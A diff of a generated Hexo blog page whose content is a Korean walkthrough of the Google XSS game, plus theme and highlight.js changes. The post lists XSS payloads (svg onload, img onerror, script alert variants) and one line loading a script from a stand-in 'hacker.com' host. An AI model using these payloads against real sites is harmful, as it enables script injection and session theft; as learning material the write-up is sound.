@@ -108,7 +108,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <body>
     
 
-<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
+<header id="l_header" class="l_header always shadow blur show"  >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -413,12 +413,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
       
         홈페이지 : https://xss-game.appspot.com/
-1. LEVEL-11&lt;svg onload=alert(1)&gt;
+1. LEVEL-1&lt;svg onload=alert(1)&gt;
 
-2. LEVEL-21&lt;img src=&quot;#&quot; onerror=alert(1)&gt;
+2. LEVEL-2&lt;img src=&quot;#&quot; onerror=alert(1)&gt;
 onerror 이벤트 핸들러로 alert를 띄워줄 수 있다.
 
-3. LEVEL-312345678910111213...
+3. LEVEL-3    &lt;script&gt;
+...
       
     
   </div>
@@ -464,7 +465,11 @@ onerror 이벤트 핸들러로 alert를 띄워줄 수 있다.
   <div class='md'>
     
       
-        1234567891011121314151617&lt;script&gt;alert(1)&lt;/script&gt;&lt;Script&gt;alert(1)&lt;/Script&gt;&lt;svg onload=alert(1)&gt;&lt;img src=&quot;#&quot; onerror=alert(1)&gt;&lt;script src=&quot;hack...
+        &lt;script&gt;alert(1)&lt;/script&gt;
+&lt;Script&gt;alert(1)&lt;/Script&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;img src=&quot;#&quot; onerror=alert(1)&gt;
+&lt;script src=&quot;hacker.com/hack.js&quot;&...
       
     
   </div>
@@ -634,8 +639,6 @@ onerror 이벤트 핸들러로 alert를 띄워줄 수 있다.
 
   
 
-  
-
 
 </aside>
 
@@ -662,42 +665,6 @@ onerror 이벤트 핸들러로 alert를 띄워줄 수 있다.
   
   <footer class="footer clearfix">
     <br><br>
-    
-      
-        <div class="aplayer-container">
-          
-
-
-        </div>
-      
-    
-      
-        <br>
-        <div class="social-wrapper">
-          
-            
-          
-            
-          
-            
-          
-        </div>
-      
-    
-      
-        <div><p>Blog content follows the <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
-</div>
-      
-    
-      
-        
-      
-    
-      
-        Use
-        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.0" target="_blank" class="codename">Volantis</a>
-        as theme
-      
     
       
         <div class='copyright'>
@@ -833,6 +800,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   loadCSS("https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css", window.volantis.loadcss);
   
+  
+  loadCSS("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/styles/solarized-light.min.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1208,6 +1177,20 @@ $(function () {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	});
+},"highlightjs")
+</script>
 
 
 
